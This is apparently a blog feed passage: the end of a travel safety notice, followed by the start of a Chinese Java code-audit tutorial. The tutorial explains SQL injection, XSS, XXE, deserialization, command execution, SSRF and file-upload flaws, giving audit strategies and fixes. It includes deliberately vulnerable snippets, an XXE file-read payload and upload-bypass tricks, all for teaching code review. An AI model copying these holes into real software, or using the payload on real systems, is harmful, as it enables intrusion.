指南</strong></p><p>1、出行期间请随身携带本人的身份证明原件（境内携带身份证，境外携带护照），未满16周岁者请携带户口本原件；超过16周岁的游客若没有办理身份证，请在户口所在地开具相关身份证明，以免影响登机或酒店入住。出行前请务必检查自己证件的有效期（护照需要保证至少6个月有效期）。</p><p>2、在旅游行程中，个别景点景区、餐厅、休息区等场所存在商场等购物场所，上述场所非旅行社安排的指定购物场所。请您根据自身需要，理性消费并索要必要票据。如产生消费争议，请自行承担相关责任，由此带来的不便，敬请谅解！</p><p>3、为了您人身、财产的安全，请您避免在公开场合暴露贵重物品及大量现金。在旅游行程中需时刻看管好首饰、相机等随身物品。</p><p>4、在自行安排活动期间，旅游者应在自己能够控制风险的范围内活动，选择自己能够控制风险的活动项目，并对自己的安全负责。旅行社不承担在此期间因旅游者自身原因或过错导致的人身、财产损失的责任。自行安排活动期间包括旅行社安排的在旅游行程中独立的自由活动期间、旅游者不参加旅游行程的活动期间以及旅游者经导游或随团工作人员（带队队长）同意暂时离队的个人活动期间等。旅游期间及自行安排活动期间请注意人身和财产安全。</p><p>5、在水上（包括江河、湖海、水库）游览或者活动时，旅游者要注意乘船安全。不可单独前往深水水域或者危险河道，选择水下游泳时，应做好安全保障措施，携带救生设备助游；旅游者经过危险地段（如陡峭、狭窄、湿滑的道路等）要注意安全，不可拥挤。贵重物品请勿携带至水上，如手机等确需携带的，请采取防水保护措施。</p><p>6、游泳、漂流、潜水、滑雪、溜冰、戏雪、冲浪、探险、热气球、高山索道等活动项目，均存在危险。参与前请根据自身条件，并充分参考当地相关部门及其它专业机构的相关公告和建议后量力而行。请务必仔细阅读景区提示，在景区指定区域内开展活动，注意人身安全，请您仔细阅读相关安全指南和警示。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计_基础篇</title>
    <link href="/2023/12/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    <url>/2023/12/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="代码审计-基础篇"><a href="#代码审计-基础篇" class="headerlink" title="代码审计__基础篇"></a>代码审计__基础篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开这个坑主要还是想帮助一些初步学习了Java基础缺不知道如何审计的同学。加上我也在学习Java审计，想做个学习历程的记录。</p><p>本系列审计内容主要分为以下内容：</p><ul><li>审计需要具备的基础</li><li>审计基础漏洞的案例介绍（其中包括SQL注入、XSS、RCE等等）</li><li>以及后面会有一些经典漏洞的分析等（这个不一定有，因为我一直也在分享其他的CVE分析文章。主要还是看个人精力吧）</li></ul><h2 id="工具和环境准备："><a href="#工具和环境准备：" class="headerlink" title="工具和环境准备："></a>工具和环境准备：</h2><p>安装的话网上都有，最好看看用IDEA搭建WEB环境之类的。可以用框架，也可以不用框架，初学者建议不要使用框架，代码靠自己手写会记忆深刻一些。因为我们需要自己动手写代码，一方面可以知道漏洞如何产生？然后如何去修复漏洞？这样自己动手写代码学习下来，学习后会比较深刻。一定一定一定自己动手做！！！！（如果你想学审计的话）</p><ul><li>IDEA（版本无所谓，最好不要用<code>Community</code>版本因为我下的那个<code>Community</code>版本里面没有tomcat相关的启动组件。这个是重点，不会的话可以先看看IDEA的基础用法)</li><li>Tomcat（版本的话Tomcat7 和 Tomcat8都可)</li><li>MySQL（这个可以用小皮代替，确实比较方便。）</li><li>Java（JAVA8！！！ 你问我什么是Java8？  **1.8.***的都是，最好把版本限制在1.8.3之内 ）</li><li><a href="https://java-decompiler.github.io/">JD-GUI</a>（这一一款Javaclass反编译工具，可以根据关键字类名等等信息进行搜索定位。其实IDEA也能办到但是根据关键字定位的话还是JD比较好）</li><li><a href="https://www.microfocus.com/zh-cn/cyberres/application-security/static-code-analyzer">FortifySCA</a> （跟PHP审计的那个差不多，自动审计结果很水。仅供参考）</li></ul><h2 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h2><p>其实就是想把Tomcat的结构图给大家清晰的展示一下，其他知识点给大家附了学习链接，这里就不过多介绍了。</p><h3 id="Tomcat架构"><a href="#Tomcat架构" class="headerlink" title="Tomcat架构"></a>Tomcat架构</h3><p>Tomcat的内容，在<a href="https://myloveguoguo.github.io/2023/10/25/%E5%88%9D%E8%AF%86%E5%86%85%E5%AD%98%E9%A9%AC/">之前的文章</a>里面有提及过，这个结构一定要清楚其中包括三大件的详细知识。这也是Javaweb开发必备的知识。本篇文章就不过多介绍细节，简单介绍一下每个模块的基础概念。</p><p><img src="https://i.miji.bid/2023/12/15/b7f97b95ba2c1513f0a62cac10062d36.png" alt="b7f97b95ba2c1513f0a62cac10062d36"></p><ul><li><code>Connector</code>：连接器，用于处理客户端与服务器之间的连接。它负责监听端口、接受传入的请求，并将请求传递给 Tomcat 的处理引擎。</li><li><code>ProtocolHandler</code>：协议处理器，用于解析特定协议的请求。它负责接收原始的网络数据流，并将其转换为可识别的请求对象。</li><li><code>Endpoint</code>：端点，表示 Tomcat 与客户端之间的连接点。它管理客户端连接的生命周期，包括连接的建立、维护和关闭。</li><li><code>Processor</code>：处理器，用于处理客户端请求。它接收来自 Connector 的请求，并调用适当的 Adapter 来处理请求。</li><li><code>Adapter</code>：适配器，用于将 Tomcat 接收到的请求适配给不同类型的容器。它将请求转发到适当的容器（如 Servlet 容器）进行处理。</li><li><code>Container</code>：容器，在 Tomcat 中指的是一个通用的组件，用于托管 Servlet、JSP 等。它负责管理和执行特定类型的 Web 组件。</li><li><code>Engine</code>：引擎，代表 Tomcat 的核心处理引擎，用于处理接收到的请求并将其路由到相应的虚拟主机（Host）。</li><li><code>Host</code>：主机，指的是 Tomcat 中的虚拟主机，用于托管一个或多个 Web 应用程序。</li><li><code>Context</code>：上下文，用于表示一个 Web 应用程序在 Tomcat 中的上下文路径和配置信息。</li><li><code>Wrapper</code>：包装器，用于包装和管理 Servlet，每个 Servlet 对应一个 Wrapper 对象。</li><li><code>Servlet</code>：Java Web 应用程序中的核心组件，用于处理客户端请求并生成响应。</li></ul><h3 id="JSP基础"><a href="#JSP基础" class="headerlink" title="JSP基础"></a>JSP基础</h3><p>基础、基础、基础！！！</p><ul><li><a href="https://link.zhihu.com/?target=https://www.runoob.com/jsp/jsp-tutorial.html">JSP 教程 | 菜鸟教程 </a></li><li><a href="https://www.bilibili.com/video/BV1Qf4y1T7Hx?p=112&vd_source=1b099c5cfbbe629dd188d9b675e8e716">黑马程序员 | JavaWeb</a></li></ul><h3 id="JDBC基础"><a href="#JDBC基础" class="headerlink" title="JDBC基础"></a>JDBC基础</h3><p>学习JDBC主要为了产出Sql注入和一些其他的非常规漏洞。</p><ul><li><a href="https://www.runoob.com/w3cnote/jdbc-use-guide.html">JDBC 教程 | 菜鸟教程 </a></li><li><a href="https://www.bilibili.com/video/BV1Qf4y1T7Hx?p=30&vd_source=1b099c5cfbbe629dd188d9b675e8e716">黑马程序员 | JavaWeb</a></li></ul><h3 id="Spring框架学习"><a href="#Spring框架学习" class="headerlink" title="Spring框架学习"></a>Spring框架学习</h3><p>学习主流框架可以让我们在今后审计过程中快速定位关键点。</p><ul><li><a href="https://github.com/Y4tacker/JavaSec/tree/main/0.%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/SpringBoot2">Y4tacker | JavaSec</a></li><li><a href="https://zhuanlan.zhihu.com/p/649404143">Native8418 | Spring Security 一</a></li><li><a href="https://zhuanlan.zhihu.com/p/649687477">Native8418 | Spring Security 二</a></li><li><a href="https://zhuanlan.zhihu.com/p/649687530">Native8418 | Spring Security 三</a></li></ul><h3 id="层级学习"><a href="#层级学习" class="headerlink" title="层级学习"></a>层级学习</h3><p>整个层级流程如下图，这里也是简单介绍一下对应的层级概念。</p><p><img src="https://i.miji.bid/2023/12/15/fed80280c831986eb1ad40db973e4c75.png" alt="fed80280c831986eb1ad40db973e4c75"></p><h4 id="Controller层"><a href="#Controller层" class="headerlink" title="Controller层"></a>Controller层</h4><p>Controller层负责具体的业务模块流程的控制，controller层负责前后端交互，接受前端请求，调用service层，接收service层返回的数据，最后返回具体的页面和数据到客户端。</p><h4 id="DAO层"><a href="#DAO层" class="headerlink" title="DAO层"></a>DAO层</h4><p>DAO层&#x3D;mapper层，现在用Mybatis逆向工程生成的mapper层，其实就是dao层。DAO层会调用entity层，DAO中会定义实际使用到的方法，比如增删改查。DAO  层的数据源和数据库连接的参数都是在配置文件中进行配置的，配置文件一般在同层的XML文件夹中。数据持久化操作就是指，把数据放到持久化的介质中，同时提供增删改查操作。</p><h4 id="Service层"><a href="#Service层" class="headerlink" title="Service层"></a>Service层</h4><p>Service层主要负责业务模块的逻辑应用设计。先设计放接口的类，再创建实现的类，然后在配置文件中进行配置其实现的关联。service层调用dao层接口，接收dao层返回的数据，完成项目的基本功能设计。</p><h4 id="额外的："><a href="#额外的：" class="headerlink" title="额外的："></a>额外的：</h4><p>Model实体层（或者叫Entity、Bean）</p><p>Entity层是实体层，也就是所谓的model，是数据库在项目中的类，该文件包含实体类的属性和对应属性的set、get方法；</p><h3 id="基础漏洞产生原因"><a href="#基础漏洞产生原因" class="headerlink" title="基础漏洞产生原因"></a>基础漏洞产生原因</h3><p>这里借一下<a href="https://su18.org/">su18师傅</a>的基础漏洞审计。大家可以去师傅的文章链接学习。我放在这里是为了自己方便查看。</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul><li>直接使用SQL语句拼接，将用户传入的参数通过字符串拼接的方式传入查询语句。<br>示例：<code>String sql = &quot;select * from test where id = &quot; + id;</code></li><li>预编译使用有误，没有调用 set 方法将变量与占位符进行对应。<br>示例：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from test where id = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstt</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br><span class="hljs-comment">// pstt.setObject(1,id);</span><br></code></pre></td></tr></table></figure><ul><li>对 % 和 _ 没有进行显示处理， 导致用户可以自行拼接进行模糊查询。</li><li>不能参数化的位置，还是有可能存在拼接的情况，如order by后面。<br>示例：<code>String sql = &quot;select * from test where id = ? order by &#39;&quot; + time + &quot;&#39; asc&quot;;</code></li><li>Mybatis中，#{}是预编译处理，${}是字符串替换，使用${}就可能导致SQL注入。<br>示例：<code>Select * from news where title like &#39;%#&#123;title&#125;%&#39;</code></li></ul><h5 id="审计策略"><a href="#审计策略" class="headerlink" title="审计策略"></a>审计策略</h5><ul><li>重点关注创建查询的函数如 <code>createQuery()</code>、<code>createSQLQuery()</code>、<code>createNativeQuery()</code>。</li><li>定位SQL语句上下文，查看是否有参数直接拼接，是否有对模糊查询关键字的过滤。</li><li>是否使用预编译技术，预编译是否完整，关键函数定位<code>setObject()</code>、<code>setInt()</code>、<code>setString()</code>、<code>setSQLXML()</code>关联上下文搜索<code>set*</code>开头的函数。</li><li>Mybatis中搜索${}，因为对于like模糊查询、order by排序、范围查询in、动态表名&#x2F;列名，没法使用预编译，只能拼接，所以还是需要手工防注入，此时可查看相关逻辑是否正确。</li><li>JPA搜索<code>JpaSort.unsafe()</code>，查看是否用实体之外的字段对查询结果排序，进行了SQL的拼接。以及查看<code>EntityManager</code>的使用，也可能存在拼接SQL的情况。</li></ul><h5 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h5><p>正确使用预编译；无论是 SQL&#x2F;HQL&#x2F;JPQL，都不进行SQL语句字符串拼接；正确理解占位符、预编译、替换、参数注入等形式的使用。</p><h4 id="XSS-链接注入-框架注入"><a href="#XSS-链接注入-框架注入" class="headerlink" title="XSS&#x2F;链接注入&#x2F;框架注入"></a>XSS&#x2F;链接注入&#x2F;框架注入</h4><h5 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>对于用户传递参数，没有进行过滤，导致恶意攻击者可以插入一些恶意的js语句、标签、frame等来获取应用或用户的敏感信息。</p><h5 id="审计策略-1"><a href="#审计策略-1" class="headerlink" title="审计策略"></a>审计策略</h5><p>审计过程要点还是定位用户的输入输出，也就是梳理数据交互以及前端展示的过程。找到一条完整的利用链之后，就是结合现有的安全措施（输出编码、过滤器等）进行判断，例如是否存在绕过的可能，或者是没有任何安全防护可直接造成攻击。</p><p>下面是一些可以快速定位的关键字：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;%<span class="hljs-operator">=</span><br>$&#123;<br>&lt;<span class="hljs-keyword">c</span>:out<br>&lt;<span class="hljs-keyword">c</span>:if<br>&lt;<span class="hljs-keyword">c</span>:forEach<br>ModelAndView<br>ModelMap<br>Model<br>request.getParameter<br>request.setAttribute<br></code></pre></td></tr></table></figure><p>一般会使用全局的Filter进行xss的过滤，但通常可能存在漏网之鱼，所以也需要审计全局过滤规则是否完善。可以通过关键字 <code>XssFilter</code> 进行搜索。</p><h5 id="如何修复-1"><a href="#如何修复-1" class="headerlink" title="如何修复"></a>如何修复</h5><p>自定义全局过滤器，对用户提交输入进行检查和过滤；对用户输入并用来展示的数据进行HTML转义，可用的工具类包括<code>org.springframework.web.util.HtmlUtils</code> 、<code>org.apache.commons.lang3.StringEscapeUtils</code>、<code>ESAPI.encoder().encodeForHTML</code> 等。</p><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><h5 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul><li>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。文档类型定义(DTD)的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。当允许引用外部实体时，恶意攻击者即可构造恶意内容访问服务器资源。<br>示例：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br>    <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///tmp/aaa&quot;</span>&gt;</span></span><br><span class="hljs-meta">       ]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>使用不可信数据来构造XML会导致XML注入漏洞，如果用户被允许输入结构化的XML片段，则他可以在XML的数据域中注入XML标签来改写目标XML文档的结构与<br>内容。</li></ul><h5 id="审计策略-2"><a href="#审计策略-2" class="headerlink" title="审计策略"></a>审计策略</h5><p>XML解析涉及的业务功能点： WebServices接口、RESTful接口、Excel文件解析、Soap协议等。</p><p>漏洞触发点就在XML解析时，因此重点审计XML解析器是否设置了相关的安全属性，禁用DTDs或者禁止使用外部实体。还有是否使用了不安全的漏洞组件。部分解析器如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.xml.parsers.DocumentBuilder<br>javax.xml.parsers.DocumentBuilderFactory<br>javax.xml.stream.XMLStreamReader<br>javax.xml.stream.XMLInputFactory<br>org.jdom.input.SAXBuilder<br>org.jdom2.input.SAXBuilder<br>org.jdom.output.XMLOutputter<br>oracle.xml.parser.v2.XMLParser<br>javax.xml.parsers.SAXParser<br>org.dom4j.io.SAXReader <br>org.dom4j.DocumentHelper<br>org.xml.sax.XMLReader<br>javax.xml.transform.sax.SAXSource <br>javax.xml.transform.TransformerFactory <br>javax.xml.transform.sax.SAXTransformerFactory <br>javax.xml.validation.SchemaFactory<br>javax.xml.validation.Validator<br>javax.xml.bind.Unmarshaller<br>javax.xml.xpath.XPathExpression<br>java.beans.XMLDecoder<br></code></pre></td></tr></table></figure><p>除此之外，关注<code>StreamSource</code>、<code>XMLConstants</code>、<code>StringReader</code>等方法的调用，在项目中搜索. xsd文件。</p><h5 id="如何修复-2"><a href="#如何修复-2" class="headerlink" title="如何修复"></a>如何修复</h5><p>使用XML解析器时禁止使用外部实体；使用白名单的方式对用户输入进行处理，避免用户输入改变XML结构或内容。</p><p>各种Features：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">是否允许使用DTDS解析<br>    http:<span class="hljs-regexp">//</span>apache.org<span class="hljs-regexp">/xml/</span>features/disallow-doctype-decl<br>是否允许使用通用实体<br>    http:<span class="hljs-regexp">//</span>xml.org<span class="hljs-regexp">/sax/</span>features/external-general-entities<br>是否允许使用参数实体<br>    http:<span class="hljs-regexp">//</span>xml.org<span class="hljs-regexp">/sax/</span>features/external-parameter-entities<br>是否允许加载外部DTD实体<br>    http:<span class="hljs-regexp">//</span>apache.org<span class="hljs-regexp">/xml/</span>features<span class="hljs-regexp">/nonvalidating/</span>load-external-dtd<br>是否启用安全性处理<br>    http:<span class="hljs-regexp">//</span>javax.xml.XMLConstants<span class="hljs-regexp">/feature/</span>secure-processing<br>是否允许使用外部DTD实体<br>    http:<span class="hljs-regexp">//</span>javax.xml.XMLConstants<span class="hljs-regexp">/property/</span>accessExternalDTD<br>是否允许使用外部Schema<br>    http:<span class="hljs-regexp">//</span>javax.xml.XMLConstants<span class="hljs-regexp">/property/</span>accessExternalSchema<br>是否允许使用外部Stylesheet<br>    http:<span class="hljs-regexp">//</span>javax.xml.XMLConstants<span class="hljs-regexp">/property/</span>accessExternalStylesheet<br></code></pre></td></tr></table></figure><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><h5 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul><li>Java程序使用<code>ObjectInputStream</code>对象的<code>readObject()</code>方法将反序列化数据转换为java对象。如果被反序列化的对象重写了<code>readObject()</code>方法，则会执行该对象的此方法。因此，当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</li><li>反序列化一个类时，通常会伴随调用 get&#x2F;set 方法注入参数，并为这个类创建一个新的实例化对象，因此会执行构造方法及静态代码块，在这种情况下，攻击者也可以挖掘gadget来执行危险的动作。</li><li>根据权限最小化原则，一般情况下反序列化的类中的<code>readObject()</code>、<code>writeObject()</code>、<code>readResolve()</code>、<code>writeReplace()</code> 方法必须被声明为 private void。否则如果 Serializable 的类开放 writeObject 函数为 public 的话，给非受信调用者过高权限，潜在有风险。</li><li>在 Java 环境中，允许处于不同受信域的组件进行数据通信，从而出现跨受信边界的数据传输。如果反序列化类中存在未加密的敏感数据，将面临泄露或被篡改的风险。</li><li>对非静态内部类的序列化依赖编译器，且随着平台的不同而不同，容易产生错误。对内部类的序列化会导致外部类的实例也被序列化。这样有可能泄露敏感数据。</li></ul><h5 id="审计策略-3"><a href="#审计策略-3" class="headerlink" title="审计策略"></a>审计策略</h5><p>反序列化操作的功能位置：导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘或DB存储等业务场景。</p><p>可以通过对网络抓包寻找序列化数据：java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。</p><p>一些服务的传输可能存在反序列化：多平台HTTP通信、RMI、JMX。</p><p>一些反序列化触发点：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>readObject<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>readUnshared<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XMLDecoder</span>.</span></span>readObject<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Yaml</span>.</span></span>load<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XStream</span>.</span></span>fromXML<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectMapper</span>.</span></span>readValue<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parseObject<br></code></pre></td></tr></table></figure><p>主要查看这些触发点的参数是否由用户可控。</p><p>全局搜索是否具有public权限的一些方法：<code>public * writeObject/readObject/readResolve/writeReplace</code>。</p><p>查看反序列化类中是否包含敏感数据。</p><p>全局查找implements Serializable 的所有内部类。</p><h5 id="如何修复-3"><a href="#如何修复-3" class="headerlink" title="如何修复"></a>如何修复</h5><ul><li>对要反序列化的对象设置黑白名单，像 fastJSON、Jackson这种官方会维护一个黑名单，持续更新，但还是建议使用白名单，可通过Hook函数<code>resolveClass()</code>来校验反序列化的类从而实现白名单校验；也可以使用Apache Commons IO Serialization包中的<code>ValidatingObjectInputStream</code>类的<code>accept()</code>方法来实现反序列化类白&#x2F;黑名单控制。</li><li>对于一些敏感的属性，将其声明为 transient，或进行加密处理。</li><li>避免内部类的序列化，或把内部类声明为静态，但还是要注意敏感信息的问题。</li></ul><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>由于业务需求，应用程序可能含有执行系统命令的功能，如果执行的命令任意用户可控，则将产生极大的危害。</p><h5 id="审计策略-4"><a href="#审计策略-4" class="headerlink" title="审计策略"></a>审计策略</h5><p>重点关注能执行命令的一些功能及函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java">Runtime.getRuntime().exec()<br>Process<br>UNIXProcess<br>ProcessImpl<br>ProcessBuilder.start()<br>GroovyShell.evaluate()<br></code></pre></td></tr></table></figure><h5 id="如何修复-4"><a href="#如何修复-4" class="headerlink" title="如何修复"></a>如何修复</h5><p>避免使用这样的功能，如必须，待执行命令尽量不由用户传入。</p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>SSRF形成的原因大都是由于代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。比如从指定URL链接获取图片、下载等。</p><h5 id="审计策略-5"><a href="#审计策略-5" class="headerlink" title="审计策略"></a>审计策略</h5><p>出现SSRF漏洞的主要业务有：</p><ul><li>通过URL地址分享网页内容</li><li>在线服务</li><li>通过URL地址加载或下载图片</li><li>加载远端配置</li></ul><p>重点关注一些HTTP请求操作函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Java">om.alibaba.druid.util.HttpClientUtils<br>sun.net.www.http.HttpClient<br>javax.net.ssl.HttpsURLConnection<br>sun.net.www.protocol.http.HttpURLConnection<br>java.net.HttpURLConnection<br>javax.servlet.http.HttpServletRequest<br>java.net.URI<br>java.net.URL<br>java.net.URLConnection<br>com.bea.uddiexplorer.Search<br>com.squareup.okhttp.Request<br>com.squareup.okhttp3.Request<br>org.apache.commons.httpclient.HttpMethodBase<br>org.apache.http.client.methods.HttpRequestBase<br></code></pre></td></tr></table></figure><p>除了建立HTTP协议连接，还可能直接通过 Socket建立连接，因此应该同样关注Socket相关类：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AsynchronousServerSocketChannel</span>.</span></span>accept/bind<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AsynchronousSocketChannel</span>.</span></span>write/read/bind/connect<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ServerSocketChannel</span>.</span></span>bind<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ServerSocket</span>.</span></span>accept/bind<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Socket</span>.</span></span>bind/connect<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Socket</span>.</span></span>get<span class="hljs-constructor">InputStream()</span>.read<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Socket</span>.</span></span>get<span class="hljs-constructor">OutputStream()</span>.write<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SocketChannel</span>.</span></span>bind/read/write/connect<br></code></pre></td></tr></table></figure><h5 id="如何修复-5"><a href="#如何修复-5" class="headerlink" title="如何修复"></a>如何修复</h5><ul><li>使用白名单校验HTTP请求url地址，例如通过InetAddress对象的isSiteLocalAddress()方法进行判断，禁止内网地址的网络请求。</li><li>避免将请求响应及错误信息返回给用户</li><li>禁用不需要的协议及限制请求端口</li></ul><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>文件上传时，由于校验不全、限制不当，可能导致被上传webshell、拒绝服务、任意文件写入等安全问题。</p><h5 id="审计策略-6"><a href="#审计策略-6" class="headerlink" title="审计策略"></a>审计策略</h5><ul><li>首先关注文件后缀验证，使用白名单或黑名单，建议使用白名单。使用<code>lastIndexOf()</code>方法获取文件后缀，使用<code>IndexOf()</code>可能被绕过。如果是白名单验证时，使用<code>toLowerCase()</code>处理再进行对比，或使用<code>equalsIgnoreCase()</code>，避免被大小写绕过。</li><li>是否校验了文件的大小。</li><li>是否校验了文件类型<code>getContentType()</code>，这种方式虽然能够被绕过，但还是会增加攻击成本。</li><li>对于使用Hutool的FileTypeUtil的<code>getType()</code>或<code>ImageIO.read()</code>通过读取文件流中前N个byte值来判断文件类型的，也可以使用类似图片马的方式进行绕过。</li><li>“%00”截断能否绕过。</li><li>QP编码特性能否绕过。<code>javax.mail.internet.MimeUtility.encodeWord()</code>方法。</li><li>有一些安全校验的顺序有问题，先将文件保存，再进行安全检测，如果不通过检测则进行删除，此时可以在文件保存后触发报错终止流程，导致不删除文件。</li></ul><p>重点是文件上传相关类或函数：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">FileUpload<br>FileUploadBase<br>FileItemIteratorImpl<br>FileItemStreamImpl<br>FileUtils<br>UploadHandleServlet<br>FileLoadServlet<br>FileOutputStream<br><span class="hljs-keyword">DiskFileItemFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartRequestEntity</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartFile</span><br><span class="hljs-keyword"></span>com.<span class="hljs-keyword">oreilly.servlet.MultipartRequest</span><br></code></pre></td></tr></table></figure><h5 id="如何修复-6"><a href="#如何修复-6" class="headerlink" title="如何修复"></a>如何修复</h5><p>对上传文件后缀进行白名单验证，验证文件大小，强制重命名后缀，上传文件单独服务器保存。</p><h4 